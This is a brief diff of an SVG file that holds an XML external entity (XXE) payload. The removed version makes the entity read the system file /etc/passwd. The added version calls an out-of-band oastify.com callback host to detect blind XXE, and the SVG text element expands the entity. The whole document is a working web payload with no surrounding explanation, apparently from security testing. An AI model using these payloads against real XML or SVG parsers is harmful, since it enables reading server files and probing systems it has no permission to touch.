@@ -1,5 +1,5 @@
 <?xml version="1.0"?>
-<!DOCTYPE test [<!ENTITY abc SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE test [<!ENTITY abc SYSTEM "http://4z4wzzhgkbaw5ghcmjq6urp0lrrif83x.oastify.com">]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&abc;</text>
 </svg>
